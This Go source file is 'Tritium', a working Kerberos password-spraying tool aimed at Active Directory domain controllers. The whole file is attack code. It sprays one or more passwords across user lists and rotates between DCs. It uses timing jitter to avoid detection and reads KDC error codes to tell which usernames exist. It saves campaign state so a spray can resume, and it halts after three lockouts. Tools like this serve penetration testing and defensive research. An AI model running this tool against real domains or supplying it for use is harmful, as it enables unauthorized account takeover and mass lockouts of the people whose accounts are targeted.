/*

  Copyright (C) 2020 Ali Ahmad

  This program is free software; you can redistribute it and/or
  modify it under the terms of the GNU General Public License
  as published by the Free Software Foundation; version 2
  of the License only.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to
  Free Software Foundation, 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.

  Contact Information:

  Ali S. Ahmad (s4r1n97@gmail.com)

*/

package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"strings"
	"time"

	kclient "github.com/ropnop/gokrb5/client"
	kconfig "github.com/ropnop/gokrb5/config"
)

const (
	banner = `
	___________      .__  __  .__               
	\__    ___/______|__|/  |_|__|__ __  _____  
	  |    |  \_  __ \  \   __\  |  |  \/     \ 
	  |    |   |  | \/  ||  | |  |  |  /  Y Y  \
	  |____|   |__|  |__||__| |__|____/|__|_|__/ v 0.1
											  

	  Author: S4R1N, alfarom256
 `
	usage = `

 Required Params:

 -d            The full domain to use (-domain targetdomain.local)
 -dc           Domain controller to authenticate against (-dc washingtondc.targetdomain.local)
 -dcf          File of domain controllers to authenticate against 
 -u            Select single user to authenticate as (-user jsmith) 
 -uf           User file to use for password spraying (-userfile ~/home/users.txt)
 -p            Password to use for spraying (-password Welcome1)

 Optional: 

 -help         Print this help menu
 -o            Tritium Output file (default spray.json)
 -w            Wait time between authentication attempts [Default 1] (-w 0)    
 -jitter       % Jitter between authentication attempts      
 -rs           Enable recursive spraying 
 -ws           Wait time between sprays [Default 3600] (-ws 1800)
 -pwf          Password file to use for recursive 
 -res          Continue a password spraying campaign
 -rf           Tritium Json file 
 `

	KERB_FMT_STRING = `[libdefaults]
default_realm = ${REALM}
dns_lookup_realm = false
dns_lookup_kdc = true
[realms]
%s = {
	kdc = %s
}`
)

type FlagOptions struct { // option var decleration
	help             bool
	username         string
	userfile         string
	domain           string
	password         string
	domainController string
	dcf              string
	wait             int
	jitter           int
	o                string

	rs  bool
	ws  int
	pwf string

	res bool
	rf  string
}

func options() *FlagOptions {
	username := flag.String("u", "", "single username to authenticate as")
	userfile := flag.String("uf", "", "userfile for spraying")
	domain := flag.String("d", "", "userdomain")
	password := flag.String("p", "", "password for spraying")
	domainController := flag.String("dc", "", "KDC to authenticate against")
	dcf := flag.String("dcf", "", "File of KDCs to Auth Against")

	help := flag.Bool("h", false, "Help Menu")
	wait := flag.Int("w", 1, "Wait time between authentication attempts")
	jitter := flag.Int("jitter", 0, "Jitter between auth attempts")
	rs := flag.Bool("rs", false, "Recursive Spray flag")
	ws := flag.Int("ws", 3600, "Wait time between sprays")
	pwf := flag.String("pwf", "", "Password file")
	res := flag.Bool("res", false, "Resumes a spray")
	rf := flag.String("rf", "", "Resume file")
	o := flag.String("o", "spray.json", "outfile")

	flag.Parse()
	return &FlagOptions{help: *help, username: *username, userfile: *userfile, domain: *domain, password: *password, domainController: *domainController, wait: *wait, rs: *rs, ws: *ws, pwf: *pwf, rf: *rf, res: *res, o: *o, jitter: *jitter, dcf: *dcf}
}
func wait(wt int, jitPerc int) {
	var jitter float64 = 0
	var wait int = 0
	var sign int = rand.Intn(2)
	if sign == 0 {
		sign = 1
	} else {
		sign = -1
	}
	if jitPerc > 0 {
		jitter = float64(rand.Intn(jitPerc)*sign) / 100 // creates jitter percentage
	} else {
		jitter = 0.0
	}
	var jitWait float64 = float64(wt*1000) * jitter // creates jitter time (plus or minus whatever seconds)
	wait = (wt * 1000) + int(jitWait)               // actual wait time
	time.Sleep(time.Duration(wait) * time.Millisecond)
}

type Authenticator interface {
	Login() (string, string, error)
}

func randomDC(dcs []string) string {
	var dc string
	if len(dcs) > 0 {
		dc = dcs[rand.Intn(len(dcs))]
	}
	return dc
}

type account struct {
	Username    string
	Domain      string
	Password    string
	Compromised bool
	PassNum     int
}

func saveState(users []account, of string) {

	file, _ := json.MarshalIndent(users, "", " ")

	_ = ioutil.WriteFile(of, file, 0644)
}
func removeUser(users []account, i int) []account {
	return append(users[:i], users[i+1:]...)
}

func kerbAuth(username string, relm string, pass string, domainController string) string {

	var domain = relm
	var user = username
	var password = pass
	var DC = domainController

	var retString string = "[" + DC + "]\t" + domain + "/" + username + ":" + password

	/*
		Formats the config per the RFC standard
	*/
	kcfg_str := fmt.Sprintf(KERB_FMT_STRING, domain, DC)

	cfg, err := kconfig.NewConfigFromString(kcfg_str)

	cl := kclient.NewClientWithPassword(user, domain, password, cfg, kclient.DisablePAFXFAST(true))
	err = cl.Login()

	if err != nil {
		if strings.Contains(err.Error(), "Networking_Error: AS Exchange Error") {
			fmt.Println("[Fatal: Networking Error - Cannot contact KDC]")
			os.Exit(1)
		} else if strings.Contains(err.Error(), "KRB_AP_ERR_SKEW") {
			fmt.Println("[FATAL: Time delta between server and client too large]")
			os.Exit(1)

		} else if strings.Contains(err.Error(), "KRB5_REALM_UNKNOWN") {

			fmt.Println("Cannot find KDC for requested realm")
			os.Exit(1)

		} else if strings.Contains(err.Error(), "KRB5_KDC_UNREACH") {

			fmt.Println("Cannot contact any KDC for requested realm")
			os.Exit(1)

		} else if strings.Contains(err.Error(), "client does not have a username") {

			retString += "\t [Blank Username]"

		} else if strings.Contains(err.Error(), "KDC_ERR_CLIENT_REVOKED") {

			retString += "\t [USER ACCOUNT LOCKED]"
			fmt.Println(retString)

		} else if strings.Contains(err.Error(), "KDC_ERR_PREAUTH_FAILED") {
			retString += "\t [Valid User But Invalid Password]"
			fmt.Println(retString)

		} else if strings.Contains(err.Error(), "KDC_ERR_C_PRINCIPAL_UNKNOWN") {

			retString += "\t [USER DOESN'T EXIST]"
			fmt.Println(retString)

		} else {

			retString += "\t [VALID Login!]"
			fmt.Println(retString)
		}

	}

	return retString
}

func linecounter(fileName string) int {
	var lines int
	f, _ := os.Open(fileName)
	scanner := bufio.NewScanner(f)

	for scanner.Scan() {
		lines++
	}
	return lines

}

func genericSpray(uf string, realm string, password string, DCs []string, wt int, of string, jitter int) {

	var counter int = 0
	var lockoutProtection int = 0       // if reaches 3 consecetive lockouts exit program
	var matcher string                  // used to see if result of auth = account lockout
	var linecount int = linecounter(uf) // counts lines in file
	users := make([]account, linecount) // creates an array with linecount length

	fmt.Println("Userfile set to: ", uf)

	file, err := os.Open(uf)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	counter = 0
	for scanner.Scan() {
		//fmt.Println(scanner.Text())

		users[counter].Username = scanner.Text() // assignment of neccessary vars
		users[counter].Domain = realm
		users[counter].Password = password
		users[counter].Compromised = false
		users[counter].PassNum = 0
		counter++ // counter to go through cells
	}
	counter = 0
	for counter < len(users) {

		if users[counter].Compromised == false {
			// if false
			users[counter].Password = password
			matcher = kerbAuth(users[counter].Username, users[counter].Domain, users[counter].Password, randomDC(DCs))
			if strings.Contains(matcher, "[VALID Login!]") {
				users[counter].Compromised = true
			}
			// lockout prevention stuff
			if strings.Contains(matcher, "[USER ACCOUNT LOCKED]") {
				lockoutProtection++
			} else if strings.Contains(matcher, "[USER DOESN'T EXIST]") {
				users = removeUser(users, counter)
				counter--
			} else {
				lockoutProtection = 0
			}
			if lockoutProtection == 3 {
				fmt.Println("3 Consective Lockouts reached, exiting the program!")
				saveState(users, of)
				break
			}

			wait(wt, jitter)
		}
		counter++
	}
	saveState(users, of)
}

func recursiveSpray(uf string, realm string, pwf string, DCs []string, wt int, ws int, of string, jitter int) {
	var counter int = 0
	var pNum int = 0
	var lockoutProtection int = 0 // if reaches 3 consecetive lockouts exit program
	var matcher string            // used to see if result of auth = account lockout
	fmt.Println("Userfile set to: ", uf)
	var linecount int = linecounter(uf) // counts lines in file
	users := make([]account, linecount) // creates an array with linecount length

	/*************************************************************************/

	file, err := os.Open(uf)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	counter = 0
	for scanner.Scan() {

		users[counter].Username = scanner.Text() // assignment of neccessary vars
		users[counter].Domain = realm
		users[counter].Password = ""
		users[counter].Compromised = false
		users[counter].PassNum = 0
		counter++ // counter to go through cells
	}
	counter = 0

	/*************************************************************************/

	// open the file and set password string to password and only set it to users that have false for
	pwfile, err := os.Open(pwf) // openspasswordfile
	fmt.Println("Password file set to:", pwf)
	if err != nil {
		log.Fatal(err)
	}
	defer pwfile.Close()
	pwscanner := bufio.NewScanner(pwfile)
	if err == nil {

	}

	for pwscanner.Scan() {

		for counter := 0; counter < len(users); counter++ {
			if users[counter].Compromised == false {
				users[counter].Password = pwscanner.Text() // sets new password value for object if object isnt compromised

				matcher = kerbAuth(users[counter].Username, users[counter].Domain, users[counter].Password, randomDC(DCs))
				if strings.Contains(matcher, "[VALID Login!]") {
					users[counter].Compromised = true
				}
				// lockout prevention stuff
				if strings.Contains(matcher, "[USER ACCOUNT LOCKED]") {
					users[counter].PassNum = pNum
					lockoutProtection++
				} else if strings.Contains(matcher, "[USER DOESN'T EXIST]") {
					users = removeUser(users, counter)
					counter--
				} else if strings.Contains(matcher, "[VALID Login!]") || strings.Contains(matcher, "[Valid User But Invalid Password]") {
					users[counter].PassNum = pNum
					lockoutProtection = 0
				}
				if lockoutProtection == 3 {
					fmt.Println("3 Consective Lockouts reached, exiting the program!")
					saveState(users, of)
					os.Exit(1)
				}
				wait(wt, jitter)
			}

		}
		saveState(users, of)
		pNum++
		wait(ws, 0)
	}

}
func resumeSpray(sprayDB string, pwstring string, rs bool, wt int, ws int, DCs []string, of string, jitter int) {

	var lockoutProtection int = 0 // if reaches 3 consecetive lockouts exit program
	var matcher string            // used to see if result of auth = account lockout

	jsonFile, err := os.Open(sprayDB)
	if err != nil {
		fmt.Println(err)
	}
	defer jsonFile.Close()
	byteValue, _ := ioutil.ReadAll(jsonFile)
	var users []account
	json.Unmarshal(byteValue, &users)

	if rs {
		var passNum = 0

		pwfile, err := os.Open(pwstring) // openspasswordfile
		fmt.Println("Password file set to:", pwstring)
		if err != nil {
			log.Fatal(err)
		}
		defer pwfile.Close()
		pwscanner := bufio.NewScanner(pwfile)
		if err == nil {

		}

		for pwscanner.Scan() {

			for i := 0; i < len(users); i++ {
				if users[i].Compromised == false && users[i].PassNum < passNum {

					users[i].Password = pwscanner.Text() // sets new password value for object if object isnt compromised

					matcher = kerbAuth(users[i].Username, users[i].Domain, users[i].Password, randomDC(DCs))
					if strings.Contains(matcher, "[VALID Login!]") {
						users[i].Compromised = true
					}
					// lockout prevention stuff
					if strings.Contains(matcher, "[USER ACCOUNT LOCKED]") {
						users[i].PassNum = passNum
						lockoutProtection++
					} else if strings.Contains(matcher, "[USER DOESN'T EXIST]") {
						users = removeUser(users, i)
						i--
					} else if strings.Contains(matcher, "[VALID Login!]") || strings.Contains(matcher, "[Valid User But Invalid Password]") {
						users[i].PassNum = passNum
						lockoutProtection = 0
					}
					if lockoutProtection == 3 {
						fmt.Println("3 Consective Lockouts reached, exiting the program!")
						saveState(users, of)
						os.Exit(1)
					}

				}
				wait(wt, jitter)
			}
			saveState(users, of)
			passNum++
			wait(ws, 0)

		}

	} else {
		// generic spray
		for i := 0; i < len(users); i++ {
			if users[i].Compromised == false {
				users[i].Password = pwstring
				matcher = kerbAuth(users[i].Username, users[i].Domain, users[i].Password, randomDC(DCs))
				if strings.Contains(matcher, "[VALID Login!]") {
					users[i].Compromised = true
				}
				// lockout prevention stuff
				if strings.Contains(matcher, "[USER ACCOUNT LOCKED]") {
					users[i].PassNum = 0
					lockoutProtection++
				} else if strings.Contains(matcher, "[USER DOESN'T EXIST]") {
					users = removeUser(users, i)
					i--
				} else if strings.Contains(matcher, "[VALID Login!]") || strings.Contains(matcher, "[Valid User But Invalid Password]") {
					users[i].PassNum = 0
					lockoutProtection = 0
				}
				if lockoutProtection == 3 {
					fmt.Println("3 Consective Lockouts reached, exiting the program!")
					saveState(users, of)
					os.Exit(1)
				}
				wait(wt, jitter)
			}

		}
		saveState(users, of)

	}
}

func main() {

	var err bool = false
	var rs bool = false
	var dcARR []string

	rand.Seed(time.Now().UnixNano())

	fmt.Println(banner)
	opt := options()

	// checking options
	if opt.help {
		fmt.Println(usage)
		os.Exit(0)
	}

	if opt.domainController == "" && opt.dcf == "" {
		fmt.Println("Error I need a KDC or a KDC file")
		os.Exit(1)
	} else if opt.dcf != "" {
		dcList, err := os.Open(opt.dcf)
		if err != nil {
			log.Fatal(err)
		}
		defer dcList.Close()
		dcs := bufio.NewScanner(dcList)
		for dcs.Scan() {
			dcARR = append(dcARR, dcs.Text())
		}
	} else {

		dcARR = append(dcARR, opt.domainController)

	}

	if opt.res {
		if opt.rf != "" {
			if opt.rs {

				resumeSpray(opt.rf, opt.pwf, opt.rs, opt.wait, opt.ws, dcARR, opt.o, opt.jitter) // recursive spray

			} else {

				resumeSpray(opt.rf, opt.password, opt.rs, opt.wait, opt.ws, dcARR, opt.o, opt.jitter) // generic spray
				os.Exit(1)

			}

		} else {
			fmt.Println("[+] Error spray database not provided")
			os.Exit(1)
		}
	} else {
		if opt.rs {
			rs = true
		}
		if opt.username == "" && opt.userfile == "" {
			fmt.Println("[+] Username or Userfile Not Provided")
			err = true
		}
		if opt.domain == "" {
			fmt.Println("[+] Domain Name Not Provided")
			err = true
		}
		if opt.password == "" && opt.rs == false {
			fmt.Println("[+] Password Not Provided")
			err = true
		}
		if err {
			fmt.Println("\nPlease reference help menu below to fix issues: ")
			fmt.Println(usage)
			os.Exit(1)
		}

		if opt.username != "" { // single user mode

			fmt.Println("Username set to: ", opt.username)
			kerbAuth(opt.username, opt.domain, opt.password, opt.domainController)
			os.Exit(0)

		} else if opt.userfile != "" { // password spray mode

			if rs == false {

				if opt.password == "" {

					fmt.Println("ERROR: Single password spray without password flag")
					os.Exit(1)

				}
				genericSpray(opt.userfile, opt.domain, opt.password, dcARR, opt.wait, opt.o, opt.jitter)

			} else {
				if opt.pwf != "" {

					recursiveSpray(opt.userfile, opt.domain, opt.pwf, dcARR, opt.wait, opt.ws, opt.o, opt.jitter)

				} else {

					fmt.Println("Error! Recursive spray selected but no password has been set!")
					os.Exit(1)

				}

			}

			os.Exit(0)
		}
	}

}
